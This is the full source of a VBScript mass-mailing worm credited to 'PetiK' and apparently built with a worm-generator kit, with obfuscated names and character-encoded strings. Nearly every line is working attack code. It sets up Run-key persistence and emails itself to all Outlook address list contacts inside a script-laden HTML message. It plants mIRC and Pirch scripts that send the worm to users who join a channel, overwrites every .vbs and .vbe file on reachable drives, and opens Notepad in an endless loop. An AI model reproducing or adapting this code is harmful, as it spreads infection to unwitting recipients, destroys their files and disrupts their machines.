'Vbs.EMM Created By PetiK
On Error Resume Next
Set d4dEkrzRKmB = CreateObject("WScript.Shell")
d4dEkrzRKmB.regwrite "HKCU\software\EMM\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set Tf3cTs4pk1E= Createobject("scripting.filesystemobject")
Tf3cTs4pk1E.copyfile wscript.scriptfullname,Tf3cTs4pk1E.GetSpecialFolder(1)& "\EMM.vbs"
d4dEkrzRKmB.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&Tf3cTs4pk1E.GetSpecialFolder(1)& "\EMM.vbs %"
if d4dEkrzRKmB.regread ("HKCU\software\EMM\mailed") <> "1" then
kBhjZ4234u7()
end if
if d4dEkrzRKmB.regread ("HKCU\software\EMM\mirqued") <> "1" then
H6YmNQ336o2 ""
end if
if d4dEkrzRKmB.regread ("HKCU\software\EMM\pirched") <> "1" then
dUjuhb827o7 ""
end if
v988p400W65()
Do
d4dEkrzRKmB.run "notepad",false
loop
Function kBhjZ4234u7()
On Error Resume Next
Set FGi871m45e1= CreateObject("Outlook.Application")
If FGi871m45e1 = "Outlook" Then
Set VkjMGB5Q4bI= Tf3cTs4pk1E.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While VkjMGB5Q4bI.atendofstream = False
hyG464S385t= VkjMGB5Q4bI.readline
W1MGJ3ZTW81= W1MGJ3ZTW81& Chr(34) & " & vbcrlf & " & Chr(34) & replace(hyG464S385t, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
VkjMGB5Q4bI.close
dzxW5U84LYo = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
dzxW5U84LYo = dzxW5U84LYo& vbCrLf & "On Error Resume Next"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "If Err.Number <> 0 Then"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "Else"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\EMM.vbs" & Chr(34) & ", True)"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "vbs.write  " & Chr(34) & W1MGJ3ZTW81& Chr(34)
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "vbs.Close"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
dzxW5U84LYo = dzxW5U84LYo & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\EMM.vbs %" & Chr(34) & ""
n3cTs4pk1E1 = n3cTs4pk1E1& vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
n3cTs4pk1E1 = n3cTs4pk1E1& vbCrLf & "End If"
n3cTs4pk1E1 = n3cTs4pk1E1 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
KdEkrzRKmB3=dzxW5U84LYo & n3cTs4pk1E1
Set YhjZ4234u78 = FGi871m45e1.GetNameSpace("MAPI")
set Ojuhb827o71=YhjZ4234u78.AddressLists
For Each QYmNQ336o2T In Ojuhb827o71
If QYmNQ336o2T.AddressEntries.Count <> 0 Then
Z88p400W655= QYmNQ336o2T.AddressEntries.Count
Set Qi871m45e1V= FGi871m45e1.CreateItem(0)
Qi871m45e1V.Subject = "Rv: 4You"
Qi871m45e1V.HTMLBody = KdEkrzRKmB3
Qi871m45e1V.DeleteAfterSubmit = True
For xjMGB5Q4bI0 = 1 To Z88p400W655
Set qG464S385tW= QYmNQ336o2T.AddressEntries(xjMGB5Q4bI0)
If Z88p400W655= 1 Then
Qi871m45e1V.BCC = qG464S385tW.Address
Else
Qi871m45e1V.BCC = Qi871m45e1V.BCC & "; " & qG464S385tW.Address
End If
Next
Qi871m45e1V.send
End If
Next
d4dEkrzRKmB.regwrite "HKCU\software\EMM\mailed", "1"
FGi871m45e1.Quit
end if
End Function
Function H6YmNQ336o2(EMGJ3ZTW81f)
On Error Resume Next
if EMGJ3ZTW81f = "" then
if Tf3cTs4pk1E.fileexists("c:\mirc\mirc.ini") then EMGJ3ZTW81f="c:\mirc"
if Tf3cTs4pk1E.fileexists("c:\mirc32\mirc.ini") then EMGJ3ZTW81f="c:\mirc32"
zPp5U7t01eE=d4dEkrzRKmB.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Tf3cTs4pk1E.fileexists(zPp5U7t01eE & "\mirc\mirc.ini") then EMGJ3ZTW81f=zPp5U7t01eE & "\mirc"
end if
if EMGJ3ZTW81f <> "" then
set EE0ixonu81z = Tf3cTs4pk1E.CreateTextFile(EMGJ3ZTW81f & "\script.ini", True)
zP3EpU5JdpW="[script]"
zP3EpU5JdpW=zP3EpU5JdpW&vbcrlf&"n0=on 1:JOIN:#:{"
zP3EpU5JdpW=zP3EpU5JdpW&vbcrlf&"n1=  /if ( $nick == $me ) { halt }"
zP3EpU5JdpW=zP3EpU5JdpW&vbcrlf&"n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&Tf3cTs4pk1E.GetSpecialFolder(1)& "\EMM.vbs" & vbCrLf & "n3=}"
EE0ixonu81z.writeline zP3EpU5JdpW
EE0ixonu81z.close
d4dEkrzRKmB.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function dUjuhb827o7(V14XZb854w0)
On Error Resume Next
if V14XZb854w0="" then
if Tf3cTs4pk1E.fileexists("c:\pirch\Pirch32.exe") then V14XZb854w0="c:\pirch"
if Tf3cTs4pk1E.fileexists("c:\pirch32\Pirch32.exe") then V14XZb854w0="c:\pirch32"
E04dxsv4ETC=d4dEkrzRKmB.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if Tf3cTs4pk1E.fileexists(E04dxsv4ETC & "\pirch\Pirch32.exe") then V14XZb854w0=E04dxsv4ETC & "\pirch\Pirch32.exe"
end if
if V14XZb854w0 <> "" then
set A039HkW7hp9= Tf3cTs4pk1E.CreateTextFile(V14XZb854w0 & "\events.ini", True)
A039HkW7hp9.WriteLine "[Levels]"
A039HkW7hp9.WriteLine "Enabled=1"
A039HkW7hp9.WriteLine "Count=6"
A039HkW7hp9.WriteLine "Level1=000-Unknowns"
A039HkW7hp9.WriteLine "000-UnknownsEnabled=1"
A039HkW7hp9.WriteLine "Level2=100-Level 100"
A039HkW7hp9.WriteLine "100-Level 100Enabled=1"
A039HkW7hp9.WriteLine "Level3=200-Level 200"
A039HkW7hp9.WriteLine "200-Level 200Enabled=1"
A039HkW7hp9.WriteLine "Level4=300-Level 300"
A039HkW7hp9.WriteLine " 300-Level 300Enabled=1"
A039HkW7hp9.WriteLine "Level5=400-Level 400 "
A039HkW7hp9.WriteLine "400-Level 400Enabled=1"
A039HkW7hp9.WriteLine "Level6=500-Level 500"
A039HkW7hp9.WriteLine "500-Level 500Enabled=1"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[000-Unknowns]"
A039HkW7hp9.WriteLine "UserCount=0"
A039HkW7hp9.WriteLine "EventCount=0"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[100-Level 100]"
A039HkW7hp9.WriteLine "User1=*!*@*"
A039HkW7hp9.WriteLine "UserCount=1"
A039HkW7hp9.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & Tf3cTs4pk1E.GetSpecialFolder(1) & "\EMM.vbs"
A039HkW7hp9.WriteLine "EventCount=1"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[200-Level 200]"
A039HkW7hp9.WriteLine "UserCount=0"
A039HkW7hp9.WriteLine "EventCount=0"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[300-Level 300]"
A039HkW7hp9.WriteLine "UserCount=0"
A039HkW7hp9.WriteLine "EventCount=0"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[400-Level 400]"
A039HkW7hp9.WriteLine "UserCount=0"
A039HkW7hp9.WriteLine "EventCount=0"
A039HkW7hp9.WriteLine ""
A039HkW7hp9.WriteLine "[500-Level 500]"
A039HkW7hp9.WriteLine "UserCount=0"
A039HkW7hp9.WriteLine "EventCount=0"
A039HkW7hp9.close
d4dEkrzRKmB.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function v988p400W65()
On Error Resume Next
Set DMB1RYgXdht = Tf3cTs4pk1E.Drives
For Each ol3aBE7BvR9 In DMB1RYgXdht
If ol3aBE7BvR9.Drivetype = Remote Then
OojO0MUKc34= ol3aBE7BvR9 & "\"
Call Fc14a7WR8Gc(OojO0MUKc34)
ElseIf ol3aBE7BvR9.IsReady Then
OojO0MUKc34= ol3aBE7BvR9&"\"
Call Fc14a7WR8Gc(OojO0MUKc34)
End If
Next
End Function
Function Fc14a7WR8Gc(tRZH7uyl8im)
pp5U7t01eEE=tRZH7uyl8im
Set Y8iyw0dTrrz= Tf3cTs4pk1E.GetFolder(pp5U7t01eEE)
Set L0ixonu81zU= Y8iyw0dTrrz.Files
For Each O3EpU5JdpWm In L0ixonu81zU
if Tf3cTs4pk1E.GetExtensionName(O3EpU5JdpWm.path) = "vbs" then
Tf3cTs4pk1E.copyfile wscript.scriptfullname , O3EpU5JdpWm.path , true
end if
if Tf3cTs4pk1E.GetExtensionName(O3EpU5JdpWm.path) = "vbe" then
Tf3cTs4pk1E.copyfile wscript.scriptfullname , O3EpU5JdpWm.path , true
end if
if O3EpU5JdpWm.name = "mirc.ini" then
H6YmNQ336o2(O3EpU5JdpWm.ParentFolder)
end if
if O3EpU5JdpWm.name = "Pirch32.exe" then
dUjuhb827o7(O3EpU5JdpWm.ParentFolder)
end if
Next
Set O3EpU5JdpWm= Y8iyw0dTrrz.SubFolders
For Each C4XZb854w07 In O3EpU5JdpWm
Call Fc14a7WR8Gc(C4XZb854w07.path)
Next
End Function
'Vbswg 1.50b
